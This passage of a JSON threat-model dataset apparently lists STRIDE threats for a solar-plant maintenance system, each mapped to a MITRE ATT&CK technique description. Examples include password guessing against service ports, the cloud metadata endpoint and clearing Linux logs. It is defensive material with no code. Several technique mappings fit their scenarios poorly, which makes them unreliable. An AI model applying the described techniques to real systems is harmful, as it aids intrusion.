                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses and discloses metadata related to the solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is stored without encryption",
                    "Role": "Database Administrator",
                    "Condition": "Unencrypted storage due to performance or cost"
                },
                {
                    "Assumption": "Insufficient access controls on metadata",
                    "Role": "System Administrator",
                    "Condition": "Weak access management policies"
                }
            ],
            "Potential Impact": "Sensitive metadata exposure can compromise the operational security of the solar grid.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "access control"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the receiver with junk data, overwhelming the system and causing a denial of service.",
            "Assumptions": [
                {
                    "Assumption": "Receiver does not have rate limiting or anti-DDoS mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "Lack of mitigation strategies"
                },
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Network Administrator",
                    "Condition": "Network security is inadequate"
                }
            ],
            "Potential Impact": "System disruption, affecting data flow and processing capabilities.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network",
                "receiver"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could overwhelm the dashboard interface, preventing employees from viewing and managing predictions.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard does not have load balancing",
                    "Role": "Web Administrator",
                    "Condition": "Site design focuses on minimal infrastructure"
                },
                {
                    "Assumption": "Insufficient monitoring of web traffic",
                    "Role": "Security Team",
                    "Condition": "Lack of robust monitoring tools"
                }
            ],
            "Potential Impact": "Unavailable dashboard, hindering operational decisions and maintenance actions.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "web",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware could target the data logger, causing it to malfunction and stop collecting sensor data.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate malware protection on data logger",
                    "Role": "System Administrator",
                    "Condition": "Outdated or no antivirus solutions"
                },
                {
                    "Assumption": "Attacker has access to the logger's software update mechanism",
                    "Role": "Network Administrator",
                    "Condition": "Weak update policies"
                }
            ],
            "Potential Impact": "Interrupted data collection, which can hinder model predictions and power optimization.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "device",
                "data logger"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit vulnerabilities to gain admin-level access to the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Platform has unpatched vulnerabilities",
                    "Role": "Cloud Administrator",
                    "Condition": "Patch management policies are not followed"
                },
                {
                    "Assumption": "Insufficient application security testing",
                    "Role": "Security Team",
                    "Condition": "Lack of regular security assessments"
                }
            ],
            "Potential Impact": "Full access to the platform, allowing data manipulation or unauthorized modifications.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could gain privileged access to the data logger through software exploits.",
            "Assumptions": [
                {
                    "Assumption": "Data logger runs outdated software with known exploits",
                    "Role": "System Administrator",
                    "Condition": "No regular updates applied"
                },
                {
                    "Assumption": "Limited security hardening on the data logger",
                    "Role": "Security Team",
                    "Condition": "Hardening steps not implemented"
                }
            ],
            "Potential Impact": "Control over data collection processes, resulting in the ability to insert, modify, or destroy data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "device",
                "software exploit"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could gain elevated privileges in the dashboard and manipulate system-wide settings.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard has unpatched security flaws",
                    "Role": "Web Administrator",
                    "Condition": "Lack of regular maintenance and updates"
                },
                {
                    "Assumption": "Weak access controls in the dashboard",
                    "Role": "System Designer",
                    "Condition": "Improperly configured roles and permissions"
                }
            ],
            "Potential Impact": "Unauthorized control over dashboard settings, affecting system visibility and operations.",
            "MITRE ATT&CK Keywords": [
                "dashboard",
                "elevation of privilege",
                "settings manipulation"
            ],
            "mitre_technique": {
                "name": "Cloud Service Dashboard",
                "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
                "id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
                "technique_id": "T1538"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the Dashboard by spoofing an employee's credentials.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the employee's login credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials are leaked or obtained through social engineering."
                },
                {
                    "Assumption": "There are insufficient additional authentication methods (e.g., MFA).",
                    "Role": "System Administrators",
                    "Condition": "Lack of multi-factor authentication implementation."
                },
                {
                    "Assumption": "The Dashboard does not have monitoring for unusual login activity.",
                    "Role": "System Security",
                    "Condition": "No anomaly detection system is in place."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive maintenance predictions and operational data.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "spoofing",
                "account access",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Container and Resource Discovery",
                "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ",
                "id": "attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336",
                "technique_id": "T1613"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a sensor device to send false data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can communicate over the network using the same protocol as legitimate sensors.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of network protocol and insufficient network segmentation."
                },
                {
                    "Assumption": "Sensor authentication is either weak or non-existent.",
                    "Role": "System Administrators",
                    "Condition": "Default authentication settings or weak device security."
                },
                {
                    "Assumption": "The Data Logger does not validate the authenticity of incoming sensor data robustly.",
                    "Role": "Data Logger Engineers",
                    "Condition": "Lack of robust cryptographic validation methods."
                }
            ],
            "Potential Impact": "Tampering with real-time operational data, leading to inaccurate predictions and power optimization.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "false data injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of the Anonymity Agent to intercept and redirect sensitive sensor data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the same network as the Anonymity Agent.",
                    "Role": "Attacker",
                    "Condition": "Insufficient network security measures."
                },
                {
                    "Assumption": "The Anonymity Agent's identity verification mechanisms are weak.",
                    "Role": "System Developers",
                    "Condition": "Lack of strong authentication protocols."
                },
                {
                    "Assumption": "There is no redundancy or verification process for data handling by the Anonymity Agent.",
                    "Role": "System Security",
                    "Condition": "No secondary check mechanisms for data processing."
                }
            ],
            "Potential Impact": "Unauthorized interception and potential misuse of sensitive pre-processed data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data being transmitted between sensors and the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "Physical access to site or network compromise."
                },
                {
                    "Assumption": "The communication channels lack encryption.",
                    "Role": "System Administrators",
                    "Condition": "Use of unencrypted data transmission."
                },
                {
                    "Assumption": "There is no integrity check on data received by the Data Logger.",
                    "Role": "System Developers",
                    "Condition": "Lack of message integrity checks."
                }
            ],
            "Potential Impact": "Corruption of the data used for AI model training, leading to incorrect maintenance predictions and power optimization.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data corruption",
                "communication channels",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the ML model files stored in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has write access to the storage system.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or insider threat."
                },
                {
                    "Assumption": "There are no integrity checks on the ML model files.",
                    "Role": "System Administrators",
                    "Condition": "Lack of file integrity monitoring."
                },
                {
                    "Assumption": "The deployment process does not verify model integrity.",
                    "Role": "System Developers",
                    "Condition": "Lack of verification steps during deployment."
                }
            ],
            "Potential Impact": "Deployment of tampered models leading to faulty predictions and potential system failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "ML models",
                "storage",
                "integrity checks"
            ],
            "mitre_technique": {
                "name": "Taint Shared Content",
                "description": "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "id": "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c",
                "technique_id": "T1080"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the Data Logger device to alter data pre-validation.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Physical security breach."
                },
                {
                    "Assumption": "The root-of-trust mechanism is either disabled or compromised.",
                    "Role": "Data Logger Engineers",
                    "Condition": "Flawed or absent root-of-trust mechanisms."
                },
                {
                    "Assumption": "There is no real-time monitoring of the Data Logger's operational integrity.",
                    "Role": "System Security",
                    "Condition": "Lack of monitoring and alert mechanisms."
                }
            ],
            "Potential Impact": "Compromised data integrity before it is sent to the central system.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "data logger",
                "root-of-trust"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies having accessed certain data on the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not comprehensive or tamper-proof.",
                    "Role": "System Administrators",
                    "Condition": "Lack of detailed and secure logging mechanisms."
                },
                {
                    "Assumption": "There is no multi-factor authentication to link access requests to individual users.",
                    "Role": "System Developers",
                    "Condition": "Single-factor authentication is in place."
                },
                {
                    "Assumption": "Access control mechanisms do not store historical data.",
                    "Role": "System Administrators",
                    "Condition": "Access logs are overwritten or not retained."
                }
            ],
            "Potential Impact": "Difficulty in verifying user actions, potentially allowing unauthorized changes to go undetected.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "access denial",
                "logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending maliciously altered sensor data after being detected.",
            "Assumptions": [
                {
                    "Assumption": "Logs for data transmission are either missing or modifiable.",
                    "Role": "System Administrators",
                    "Condition": "Lack of secure logging mechanisms."
                },
                {
                    "Assumption": "Data Logger does not have a tamper-evident design.",
                    "Role": "System Developers",
                    "Condition": "No physical or software tamper protections."
                },
                {
                    "Assumption": "There is no immutable storage for data history.",
                    "Role": "System Administrators",
                    "Condition": "Logs can be edited or deleted."
                }
            ],
            "Potential Impact": "Inability to trace the source of tampered data, leading to challenges in incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data transmission",
                "logging",
                "tamper-evidence"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
